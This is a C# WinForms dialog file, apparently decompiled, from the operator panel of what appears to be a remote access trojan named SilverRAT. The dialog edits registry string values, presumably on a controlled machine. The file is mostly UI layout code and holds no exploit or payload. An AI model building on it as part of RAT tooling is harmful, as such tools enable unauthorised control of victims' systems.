using Bunifu.Framework.UI;
using Bunifu.UI.WinForms;
using Guna.UI2.WinForms;
using Server.Helper;
using System;
using System.ComponentModel;
using System.Windows.Forms;

namespace SilverRAT.Forms;

public class FormRegValueEditString : Form
{
    private readonly RegistrySeeker.RegValueData _value;

    private IContainer components = null;

    private BunifuDragControl FormDragControl1;

    private BunifuElipse PanelElipse;

    private Panel panelForm;

    private Guna2ResizeBox FormResizeBox1;

    private Guna2CircleButton ButtClose;

    private BunifuLabel bunifuLabel1;

    private Guna2CircleButton ButtionMinimized;

    private Guna2CircleButton ButtonMaximized;

    private BunifuPanel PanelBottom;

    private BunifuPanel PanelLeft;

    private BunifuPanel PanelTOP;

    private BunifuPanel PanelRight;

    private Guna2GradientButton Save;

    public BunifuTextBox valueDataTxtBox;

    public BunifuTextBox valueNameTxtBox;

    public FormRegValueEditString(RegistrySeeker.RegValueData value)
    {
        _value = value;
        InitializeComponent();
        MaximumSize = base.Size;
        MinimumSize = base.Size;
        valueNameTxtBox.Text = RegValueHelper.GetName(value.Name);
        valueDataTxtBox.Text = Server.Helper.ByteConverter.ToString(value.Data);
    }

    private void FormRegValueEditString_Load(object sender, EventArgs e)
    {
        try
        {
            PanelElipse.ElipseRadius = Settings.CurvatureForm;
            if (Settings.EnableEdgecurvatureForm)
            {
                PanelLeft.BackgroundColor = Settings.ColorCurvatureForm;
                PanelTOP.BackgroundColor = Settings.ColorCurvatureForm;
                PanelBottom.BackgroundColor = Settings.ColorCurvatureForm;
                PanelRight.BackgroundColor = Settings.ColorCurvatureForm;
            }
            else
            {
                PanelLeft.Visible = false;
                PanelTOP.Visible = false;
                PanelBottom.Visible = false;
                PanelRight.Visible = false;
            }
        }
        catch
        {
        }
    }

    private void FormRegValueEditString_Shown(object sender, EventArgs e)
    {
        Program.Silver.TransitionShowng.ShowSync(panelForm);
    }

    private void Save_Click(object sender, EventArgs e)
    {
        _value.Data = Server.Helper.ByteConverter.GetBytes(valueDataTxtBox.Text);
        base.Tag = _value;
        base.DialogResult = DialogResult.OK;
        Program.Silver.TransitionHiddeng.HideSync(panelForm);
        Close();
    }

    private void ButtClose_Click(object sender, EventArgs e)
    {
        try
        {
            Program.Silver.TransitionHiddeng.HideSync(panelForm);
            Close();
        }
        catch
        {
            Close();
        }
    }

    private void ButtonMaximized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Maximized;
        }
        else if (base.WindowState == FormWindowState.Maximized)
        {
            base.WindowState = FormWindowState.Normal;
        }
    }

    private void ButtionMinimized_Click(object sender, EventArgs e)
    {
        if (base.WindowState != FormWindowState.Minimized)
        {
            base.WindowState = FormWindowState.Minimized;
        }
    }

    protected override void Dispose(bool disposing)
    {
        if (disposing && components != null)
        {
            components.Dispose();
        }
        base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
        this.components = new System.ComponentModel.Container();
        System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Forms.FormRegValueEditString));
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties2 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties3 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties4 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties5 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties6 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties7 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        Bunifu.UI.WinForms.BunifuTextBox.StateProperties stateProperties8 = new Bunifu.UI.WinForms.BunifuTextBox.StateProperties();
        this.FormDragControl1 = new Bunifu.Framework.UI.BunifuDragControl(this.components);
        this.panelForm = new System.Windows.Forms.Panel();
        this.valueDataTxtBox = new Bunifu.UI.WinForms.BunifuTextBox();
        this.FormResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
        this.valueNameTxtBox = new Bunifu.UI.WinForms.BunifuTextBox();
        this.ButtClose = new Guna.UI2.WinForms.Guna2CircleButton();
        this.bunifuLabel1 = new Bunifu.UI.WinForms.BunifuLabel();
        this.ButtionMinimized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.ButtonMaximized = new Guna.UI2.WinForms.Guna2CircleButton();
        this.PanelBottom = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelLeft = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelTOP = new Bunifu.UI.WinForms.BunifuPanel();
        this.PanelRight = new Bunifu.UI.WinForms.BunifuPanel();
        this.Save = new Guna.UI2.WinForms.Guna2GradientButton();
        this.PanelElipse = new Bunifu.Framework.UI.BunifuElipse(this.components);
        this.panelForm.SuspendLayout();
        base.SuspendLayout();
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.panelForm;
        this.FormDragControl1.Vertical = true;
        this.panelForm.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.panelForm.BackColor = System.Drawing.Color.White;
        this.panelForm.Controls.Add(this.valueDataTxtBox);
        this.panelForm.Controls.Add(this.FormResizeBox1);
        this.panelForm.Controls.Add(this.valueNameTxtBox);
        this.panelForm.Controls.Add(this.ButtClose);
        this.panelForm.Controls.Add(this.bunifuLabel1);
        this.panelForm.Controls.Add(this.ButtionMinimized);
        this.panelForm.Controls.Add(this.ButtonMaximized);
        this.panelForm.Controls.Add(this.PanelBottom);
        this.panelForm.Controls.Add(this.PanelLeft);
        this.panelForm.Controls.Add(this.PanelTOP);
        this.panelForm.Controls.Add(this.PanelRight);
        this.panelForm.Controls.Add(this.Save);
        this.panelForm.Location = new System.Drawing.Point(12, 12);
        this.panelForm.Name = "panelForm";
        this.panelForm.Size = new System.Drawing.Size(482, 244);
        this.panelForm.TabIndex = 573;
        this.panelForm.Visible = false;
        this.valueDataTxtBox.AcceptsReturn = false;
        this.valueDataTxtBox.AcceptsTab = false;
        this.valueDataTxtBox.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.valueDataTxtBox.AnimationSpeed = 200;
        this.valueDataTxtBox.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.valueDataTxtBox.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.valueDataTxtBox.AutoSizeHeight = true;
        this.valueDataTxtBox.BackColor = System.Drawing.Color.Transparent;
        this.valueDataTxtBox.BackgroundImage = (System.Drawing.Image)resources.GetObject("valueDataTxtBox.BackgroundImage");
        this.valueDataTxtBox.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.valueDataTxtBox.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.valueDataTxtBox.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.valueDataTxtBox.BorderColorIdle = System.Drawing.Color.Silver;
        this.valueDataTxtBox.BorderRadius = 2;
        this.valueDataTxtBox.BorderThickness = 1;
        this.valueDataTxtBox.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.valueDataTxtBox.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.valueDataTxtBox.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.valueDataTxtBox.DefaultText = "";
        this.valueDataTxtBox.FillColor = System.Drawing.Color.White;
        this.valueDataTxtBox.HideSelection = true;
        this.valueDataTxtBox.IconLeft = null;
        this.valueDataTxtBox.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.valueDataTxtBox.IconPadding = 10;
        this.valueDataTxtBox.IconRight = null;
        this.valueDataTxtBox.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.valueDataTxtBox.Lines = new string[0];
        this.valueDataTxtBox.Location = new System.Drawing.Point(18, 129);
        this.valueDataTxtBox.MaxLength = 32767;
        this.valueDataTxtBox.MinimumSize = new System.Drawing.Size(1, 1);
        this.valueDataTxtBox.Modified = false;
        this.valueDataTxtBox.Multiline = false;
        this.valueDataTxtBox.Name = "valueDataTxtBox";
        stateProperties.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties.FillColor = System.Drawing.Color.Empty;
        stateProperties.ForeColor = System.Drawing.Color.Empty;
        stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.valueDataTxtBox.OnActiveState = stateProperties;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.valueDataTxtBox.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.valueDataTxtBox.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.valueDataTxtBox.OnIdleState = stateProperties4;
        this.valueDataTxtBox.Padding = new System.Windows.Forms.Padding(3);
        this.valueDataTxtBox.PasswordChar = '\0';
        this.valueDataTxtBox.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.valueDataTxtBox.PlaceholderText = "Value name";
        this.valueDataTxtBox.ReadOnly = false;
        this.valueDataTxtBox.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.valueDataTxtBox.SelectedText = "";
        this.valueDataTxtBox.SelectionLength = 0;
        this.valueDataTxtBox.SelectionStart = 0;
        this.valueDataTxtBox.ShortcutsEnabled = true;
        this.valueDataTxtBox.Size = new System.Drawing.Size(444, 24);
        this.valueDataTxtBox.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.valueDataTxtBox.TabIndex = 605;
        this.valueDataTxtBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.valueDataTxtBox.TextMarginBottom = 0;
        this.valueDataTxtBox.TextMarginLeft = 3;
        this.valueDataTxtBox.TextMarginTop = 1;
        this.valueDataTxtBox.TextPlaceholder = "Value name";
        this.valueDataTxtBox.UseSystemPasswordChar = false;
        this.valueDataTxtBox.WordWrap = true;
        this.FormResizeBox1.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.FormResizeBox1.ForeColor = System.Drawing.Color.Empty;
        this.FormResizeBox1.Location = new System.Drawing.Point(456, 217);
        this.FormResizeBox1.Name = "FormResizeBox1";
        this.FormResizeBox1.Size = new System.Drawing.Size(20, 20);
        this.FormResizeBox1.TabIndex = 604;
        this.FormResizeBox1.TargetControl = this;
        this.valueNameTxtBox.AcceptsReturn = false;
        this.valueNameTxtBox.AcceptsTab = false;
        this.valueNameTxtBox.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.valueNameTxtBox.AnimationSpeed = 200;
        this.valueNameTxtBox.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.valueNameTxtBox.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.valueNameTxtBox.AutoSizeHeight = true;
        this.valueNameTxtBox.BackColor = System.Drawing.Color.Transparent;
        this.valueNameTxtBox.BackgroundImage = (System.Drawing.Image)resources.GetObject("valueNameTxtBox.BackgroundImage");
        this.valueNameTxtBox.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.valueNameTxtBox.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.valueNameTxtBox.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.valueNameTxtBox.BorderColorIdle = System.Drawing.Color.Silver;
        this.valueNameTxtBox.BorderRadius = 2;
        this.valueNameTxtBox.BorderThickness = 1;
        this.valueNameTxtBox.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.valueNameTxtBox.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.valueNameTxtBox.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.valueNameTxtBox.DefaultText = "";
        this.valueNameTxtBox.FillColor = System.Drawing.Color.White;
        this.valueNameTxtBox.HideSelection = true;
        this.valueNameTxtBox.IconLeft = null;
        this.valueNameTxtBox.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.valueNameTxtBox.IconPadding = 10;
        this.valueNameTxtBox.IconRight = null;
        this.valueNameTxtBox.IconRightCursor = System.Windows.Forms.Cursors.IBeam;
        this.valueNameTxtBox.Lines = new string[0];
        this.valueNameTxtBox.Location = new System.Drawing.Point(18, 95);
        this.valueNameTxtBox.MaxLength = 32767;
        this.valueNameTxtBox.MinimumSize = new System.Drawing.Size(1, 1);
        this.valueNameTxtBox.Modified = false;
        this.valueNameTxtBox.Multiline = false;
        this.valueNameTxtBox.Name = "valueNameTxtBox";
        stateProperties5.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties5.FillColor = System.Drawing.Color.Empty;
        stateProperties5.ForeColor = System.Drawing.Color.Empty;
        stateProperties5.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.valueNameTxtBox.OnActiveState = stateProperties5;
        stateProperties6.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties6.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties6.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties6.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.valueNameTxtBox.OnDisabledState = stateProperties6;
        stateProperties7.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties7.FillColor = System.Drawing.Color.Empty;
        stateProperties7.ForeColor = System.Drawing.Color.Empty;
        stateProperties7.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.valueNameTxtBox.OnHoverState = stateProperties7;
        stateProperties8.BorderColor = System.Drawing.Color.Silver;
        stateProperties8.FillColor = System.Drawing.Color.White;
        stateProperties8.ForeColor = System.Drawing.Color.Empty;
        stateProperties8.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.valueNameTxtBox.OnIdleState = stateProperties8;
        this.valueNameTxtBox.Padding = new System.Windows.Forms.Padding(3);
        this.valueNameTxtBox.PasswordChar = '\0';
        this.valueNameTxtBox.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.valueNameTxtBox.PlaceholderText = "Value name";
        this.valueNameTxtBox.ReadOnly = false;
        this.valueNameTxtBox.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.valueNameTxtBox.SelectedText = "";
        this.valueNameTxtBox.SelectionLength = 0;
        this.valueNameTxtBox.SelectionStart = 0;
        this.valueNameTxtBox.ShortcutsEnabled = true;
        this.valueNameTxtBox.Size = new System.Drawing.Size(444, 24);
        this.valueNameTxtBox.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.valueNameTxtBox.TabIndex = 603;
        this.valueNameTxtBox.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.valueNameTxtBox.TextMarginBottom = 0;
        this.valueNameTxtBox.TextMarginLeft = 3;
        this.valueNameTxtBox.TextMarginTop = 1;
        this.valueNameTxtBox.TextPlaceholder = "Value name";
        this.valueNameTxtBox.UseSystemPasswordChar = false;
        this.valueNameTxtBox.WordWrap = true;
        this.ButtClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtClose.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtClose.CheckedState.Parent = this.ButtClose;
        this.ButtClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtClose.CustomImages.Parent = this.ButtClose;
        this.ButtClose.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtClose.ForeColor = System.Drawing.Color.White;
        this.ButtClose.HoverState.BorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.CustomBorderColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.FillColor = System.Drawing.Color.FromArgb(237, 107, 96);
        this.ButtClose.HoverState.Parent = this.ButtClose;
        this.ButtClose.Location = new System.Drawing.Point(457, 9);
        this.ButtClose.Name = "ButtClose";
        this.ButtClose.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtClose.ShadowDecoration.Parent = this.ButtClose;
        this.ButtClose.Size = new System.Drawing.Size(17, 17);
        this.ButtClose.TabIndex = 573;
        this.ButtClose.Click += new System.EventHandler(ButtClose_Click);
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.25f, System.Drawing.FontStyle.Bold);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(10, 9);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(102, 15);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "RegValueEditString";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ButtionMinimized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtionMinimized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtionMinimized.CheckedState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtionMinimized.CustomImages.Parent = this.ButtionMinimized;
        this.ButtionMinimized.FillColor = System.Drawing.Color.FromArgb(97, 196, 83);
        this.ButtionMinimized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtionMinimized.ForeColor = System.Drawing.Color.White;
        this.ButtionMinimized.HoverState.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Location = new System.Drawing.Point(409, 9);
        this.ButtionMinimized.Name = "ButtionMinimized";
        this.ButtionMinimized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtionMinimized.ShadowDecoration.Parent = this.ButtionMinimized;
        this.ButtionMinimized.Size = new System.Drawing.Size(17, 17);
        this.ButtionMinimized.TabIndex = 575;
        this.ButtionMinimized.Click += new System.EventHandler(ButtionMinimized_Click);
        this.ButtonMaximized.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.ButtonMaximized.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ButtonMaximized.CheckedState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Cursor = System.Windows.Forms.Cursors.Hand;
        this.ButtonMaximized.CustomImages.Parent = this.ButtonMaximized;
        this.ButtonMaximized.FillColor = System.Drawing.Color.FromArgb(244, 190, 83);
        this.ButtonMaximized.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.ButtonMaximized.ForeColor = System.Drawing.Color.White;
        this.ButtonMaximized.HoverState.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Location = new System.Drawing.Point(433, 9);
        this.ButtonMaximized.Name = "ButtonMaximized";
        this.ButtonMaximized.ShadowDecoration.Mode = Guna.UI2.WinForms.Enums.ShadowMode.Circle;
        this.ButtonMaximized.ShadowDecoration.Parent = this.ButtonMaximized;
        this.ButtonMaximized.Size = new System.Drawing.Size(17, 17);
        this.ButtonMaximized.TabIndex = 574;
        this.ButtonMaximized.Click += new System.EventHandler(ButtonMaximized_Click);
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(142, 233);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(196, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 74);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 101);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(142, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(196, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(472, 74);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 101);
        this.PanelRight.TabIndex = 591;
        this.Save.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.Save.Animated = true;
        this.Save.BackColor = System.Drawing.Color.White;
        this.Save.BorderRadius = 1;
        this.Save.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Save.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Save.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.Save.CheckedState.Parent = this.Save;
        this.Save.Cursor = System.Windows.Forms.Cursors.Hand;
        this.Save.CustomImages.Parent = this.Save;
        this.Save.Enabled = false;
        this.Save.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Save.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.Save.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.Save.ForeColor = System.Drawing.Color.White;
        this.Save.HoverState.Parent = this.Save;
        this.Save.Location = new System.Drawing.Point(376, 186);
        this.Save.Name = "Save";
        this.Save.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.Save.PressedDepth = 50;
        this.Save.ShadowDecoration.Parent = this.Save;
        this.Save.Size = new System.Drawing.Size(86, 25);
        this.Save.TabIndex = 574;
        this.Save.Text = "OK";
        this.Save.Click += new System.EventHandler(Save_Click);
        this.PanelElipse.ElipseRadius = 4;
        this.PanelElipse.TargetControl = this.panelForm;
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(506, 268);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "FormRegValueEditString";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "FormRegValueEditString";
        base.TopMost = true;
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.Load += new System.EventHandler(FormRegValueEditString_Load);
        this.panelForm.ResumeLayout(false);
        this.panelForm.PerformLayout();
        base.ResumeLayout(false);
    }
}
